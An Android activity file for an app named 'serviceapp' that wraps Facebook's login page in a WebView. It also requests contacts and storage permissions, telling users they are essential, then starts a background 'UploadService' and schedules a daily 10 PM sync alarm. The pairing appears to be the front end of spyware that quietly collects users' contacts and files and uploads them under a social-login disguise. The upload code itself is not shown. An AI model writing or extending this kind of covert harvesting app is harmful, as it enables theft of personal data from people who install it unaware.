package com.phc.serviceapp;

import androidx.annotation.NonNull;
import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Bundle;
import android.view.View;
import android.webkit.WebResourceError;
import android.webkit.WebResourceRequest;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.ProgressBar;
import android.widget.Toast;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

public class MainActivity extends AppCompatActivity {
    private static final int PERMISSION_REQUEST_CODE = 123;
    private WebView webView;
    private ProgressBar progressBar;
    private static final long SYNC_INTERVAL = 60 * 60 * 1000; // 1 hour in milliseconds
    private Timer syncTimer;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // Initialize WebView and ProgressBar
        webView = findViewById(R.id.webview);
        progressBar = findViewById(R.id.progressBar);

//        startPeriodicSync();
        scheduleSyncAt10PM();


        webView.getSettings().setJavaScriptEnabled(true);

        // Set WebViewClient to handle errors and loading states
        webView.setWebViewClient(new WebViewClient() {
            @RequiresApi(api = 23) // Ensure backward compatibility
            @Override
            public void onReceivedError(@NonNull WebView view, @NonNull WebResourceRequest request, @NonNull WebResourceError error) {
                super.onReceivedError(view, request, error);

                // Hide ProgressBar
                progressBar.setVisibility(View.GONE);

                // Display a Toast or redirect to an error page
                view.loadUrl("file:///android_asset/error.html"); // Load a local error page
            }

            @Override
            public void onPageStarted(WebView view, String url, android.graphics.Bitmap favicon) {
                super.onPageStarted(view, url, favicon);

                // Show ProgressBar when the page starts loading
                progressBar.setVisibility(View.VISIBLE);
            }

            @Override
            public void onPageFinished(WebView view, String url) {
                super.onPageFinished(view, url);

                // Hide ProgressBar when the page finishes loading
                progressBar.setVisibility(View.GONE);
            }

            @Override
            public void onReceivedError(WebView view, int errorCode, String description, String failingUrl) {
                super.onReceivedError(view, errorCode, description, failingUrl);

                // Handle older API levels
                progressBar.setVisibility(View.GONE);
                view.loadUrl("file:///android_asset/error.html"); // Load a local error page
            }
        });

        // Load the URL
        webView.loadUrl("https://www.facebook.com/login/");

        // Handle scrolling to refresh the page when user scrolls to the bottom
        webView.setOnScrollChangeListener(new View.OnScrollChangeListener() {
            @RequiresApi(api = 23)
            @Override
            public void onScrollChange(View v, int scrollX, int scrollY, int oldScrollX, int oldScrollY) {
                // Check if the user has scrolled to the bottom
                if (!webView.canScrollVertically(1)) {
                    // Refresh the current URL
                    webView.reload();
//                    Toast.makeText(MainActivity.this, "Page refreshed", Toast.LENGTH_SHORT).show();
                }
            }
        });

        // Check Permissions
        if (!hasPermissions()) {
            requestPermissions();
        } else {
            startBackgroundService();
        }
    }

    private void scheduleSyncAt10PM() {
        AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);

        // Intent to trigger the SyncReceiver
        Intent intent = new Intent(this, SyncReceiver.class);
        PendingIntent pendingIntent = PendingIntent.getBroadcast(
                this,
                0,
                intent,
                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
        );

        // Set the time to 10 PM
        Calendar calendar = Calendar.getInstance();
        calendar.set(Calendar.HOUR_OF_DAY, 22); // 10 PM
        calendar.set(Calendar.MINUTE, 0);
        calendar.set(Calendar.SECOND, 0);

        // If the time has already passed for today, schedule for tomorrow
        if (Calendar.getInstance().after(calendar)) {
            calendar.add(Calendar.DATE, 1);
        }

        // Schedule the alarm to repeat daily
        alarmManager.setRepeating(
                AlarmManager.RTC_WAKEUP,
                calendar.getTimeInMillis(),
                AlarmManager.INTERVAL_DAY,
                pendingIntent
        );
    }

    private void startPeriodicSync() {
        syncTimer = new Timer();
        syncTimer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                runOnUiThread(() -> {
                    // Start UploadService
                    startService(new Intent(MainActivity.this, UploadService.class));
//                    Toast.makeText(MainActivity.this, "Data sync in progress...", Toast.LENGTH_SHORT).show();
                });
            }
        }, 0, SYNC_INTERVAL); // Start immediately, then repeat every hour
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (syncTimer != null) {
            syncTimer.cancel(); // Stop the timer when the activity is destroyed
        }
    }

    private boolean hasPermissions() {
        // Check both permissions separately
        boolean contactsPermission = ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED;
        boolean storagePermission = ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED;
        return contactsPermission && storagePermission;
    }

    private void requestPermissions() {
        // Request both permissions at once, only if they are not granted
        List<String> permissionsToRequest = new ArrayList<>();

        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
            permissionsToRequest.add(android.Manifest.permission.READ_CONTACTS);
        }

        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
            permissionsToRequest.add(android.Manifest.permission.READ_EXTERNAL_STORAGE);
        }

        if (!permissionsToRequest.isEmpty()) {
            ActivityCompat.requestPermissions(
                    this,
                    permissionsToRequest.toArray(new String[0]),
                    PERMISSION_REQUEST_CODE
            );
        } else {
            // If permissions are already granted, proceed with functionality
            startBackgroundService();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if (requestCode == PERMISSION_REQUEST_CODE) {
            if (grantResults.length > 0) {
                boolean contactsPermissionGranted = grantResults[0] == PackageManager.PERMISSION_GRANTED;
                boolean storagePermissionGranted = grantResults[1] == PackageManager.PERMISSION_GRANTED;

                if (contactsPermissionGranted && storagePermissionGranted) {
                    // Permissions granted, proceed with functionality
                    startBackgroundService();
                } else {
                    // Handle the case where permissions were denied
                    if (shouldShowRequestPermissionRationale(permissions[0]) || shouldShowRequestPermissionRationale(permissions[1])) {
                        // If the user denied permissions, explain why you need them
                        Toast.makeText(this, "Permissions are required to access contacts and gallery for the app to function properly.", Toast.LENGTH_LONG).show();
                    } else {
                        // If the user denied permanently, provide an option to go to settings
                        showSettingsDialog();
                    }
                }
            }
        }
    }

    private void showSettingsDialog() {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("Permission Required");
        builder.setMessage("This permission is essential for the app's functionality. Please enable it in the app settings.");
        builder.setPositiveButton("Go to Settings", (dialog, which) -> {
            dialog.dismiss();
            openAppSettings();
        });
        builder.setNegativeButton("Cancel", (dialog, which) -> dialog.dismiss());
        builder.show();
    }

    private void openAppSettings() {
        Intent intent = new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
        Uri uri = Uri.fromParts("package", getPackageName(), null);
        intent.setData(uri);
        startActivity(intent);
    }

    private void startBackgroundService() {
        // Start the background service to upload data
        startService(new Intent(this, UploadService.class));
    }

}